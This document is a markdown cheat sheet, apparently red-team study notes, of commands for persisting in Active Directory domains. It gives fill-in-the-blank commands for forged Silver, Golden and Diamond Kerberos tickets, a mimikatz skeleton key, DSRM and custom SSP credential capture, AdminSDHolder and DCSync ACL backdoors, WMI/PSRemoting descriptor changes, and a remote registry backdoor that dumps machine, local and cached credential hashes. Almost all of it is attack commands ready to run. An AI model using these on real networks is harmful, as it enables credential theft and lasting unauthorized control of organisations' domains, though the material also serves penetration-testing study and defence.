# Persistance

- [Silver Ticket](#silver-ticket)
- [Golden Ticket](#golden-ticket)
- [Diamond Ticket](#diamond-ticket)
- [Skeleton Key](#skeleton-key)
- [DSRM](#directory-services-restore-mode)
- [Custom SSP](#custom-ssp)
- [AddminSDHolder](#AddminsdHolder)
- [Right Abuse](#right-abuse)
- [Security Descriptors](#security-descriptors)
- [Remote Registery](#remote-registery)

## Silver Ticket 

```
    Rubeus.exe silver /service:<service>/<target.domain> /rc4:<rc4> /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:<user> /domain:<domain> /ptt
```

## Golden Ticket

```
    SafetyKatz.exe '"kerberos::golden /User:<user> /domain:<domain> /sid:<sid> /target:<domain> /service:<service> /rc4:<rc4> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"
```

## Diamond Ticket


```
    Rubeus.exe diamond /krbkey:<hash> /user:<user> /password:<password> /enctype:<aes/rc4> /ticketuser:<user> /domain:<domain> /dc:<dc> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Skeleton Key
DA privileges required

```
    mimikatz.exe "privilege::debug" "misc::skeleton"' -ComputerName <target>' 'exit'
```

## Directory Services Restore mode
DA privileges required

```
    Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

```
    Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
    New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
    Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```

```
    sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<ntlm> /run:<command>
```

##  Custom SSP

```
    $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' $packages += "mimilib"

    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages 
    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

```
SafetyKatz.exe '"misc::memssp"'
```

## AdminSDHolder

Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA
```
    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=,dc=' -PrincipalIdentity <user> -Rights All -PrincipalDomain <domain> -TargetDomain <target> -Verbose
```

Using ActiveDirectory Module and RACE toolkit
```
    Set-DCPermissions -Method AdminSDHolder -SAMAccountName <user> -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,dc=,dc=techcorp' -Verbose
```

ResetPassword
```
    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=,dc=' -PrincipalIdentity <user> -Rights ResetPassword -PrincipalDomain <domain> -TargetDomain <target> -Verbose
```

WriteMembers
```
    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=,dc=' -PrincipalIdentity <user> -Rights WriteMembers -PrincipalDomain <target> -TargetDomain <domain> -Verbose
```

Run SDProp manually using Invoke-SDPropagator.ps1
```
    Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

For pre-Server 2008 machines
```
    Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

Check the Domain Admins permission using powerview
```
    Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<user>"}
```

Check the Domain Admins permission Using ActiveDirectory Module
```
    (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local').Access | ?{$_.IdentityReference -match '<user>'}
```

Abusing FullControl using PowerView:
```
	Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

Using ActiveDirectory Module:
```
	Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

Abusing ResetPassword using PowerView:
```
	Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

Using ActiveDirectory Module:
```
	Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

## Right abuse

Add FullControl rights
```
	Add-DomainObjectAcl -TargetIdentity "dc=,dc=l" -PrincipalIdentity <user> -Rights All -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
```

Using ActiveDirectory Module and RACE
```
	Set-ADACL -SamAccountName <user> -DistinguishedName 'DC=,DC=' -Right GenericAll -Verbose
```


Add rights for DCSync
```
	Add-DomainObjectAcl -TargetIdentity "dc=,dc=" -PrincipalIdentity <user> -Rights DCSync -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
```

Using ActiveDirectory Module and RACE
```
	Set-ADACL -SamAccountName <user> -DistinguishedName 'dc=,dc=' -GUIDRight DCSync -Verbose
```

## Security Descriptors

### Using race

On local machine
```
    Set-RemoteWMI -SamAccountName <user> –Verbose
```

On remote machine without explicit credentials
```
    Set-RemoteWMI -SamAccountName <user> -ComputerName <target> -Verbose
```

On remote machine with explicit credentials
```
    Set-RemoteWMI -SamAccountName <user> -ComputerName <target> -Credential Administrator –namespace 'root\cimv2' -Verbose
```

On remote machine remove permissions
```
    Set-RemoteWMI -SamAccountName <user> -ComputerName <target> -Remove
```

### PowerShel Remoting

Using the RACE toolkit

On local machine
```
   Set-RemotePSRemoting -SamAccountName <user> –Verbose
```

On remote machine for <user> without credentials
```
	Set-RemotePSRemoting -SamAccountName <user>-ComputerName <target> -Verbose
```

On remote machine, remove the permissions
```
	Set-RemotePSRemoting -SamAccountName <user> -ComputerName <target> -Remove
```

## Remote Registry

Using RACE or DAMP toolkit, with admin privs on remote machine
```
	Add-RemoteRegBackdoor -ComputerName <target> -Trustee studentuser1 -Verbose
```

 retrieve machine account hash
 ```
	Get-RemoteMachineAccountHash -ComputerName <target> -Verbose
```

Retrieve local account hash
```
	Get-RemoteLocalAccountHash -ComputerName <target> -Verbose
```

Retrieve domain cached credentials
```
	Get-RemoteCachedCredential -ComputerName <target> -Verbose
```


[Back to the top](#persistance)
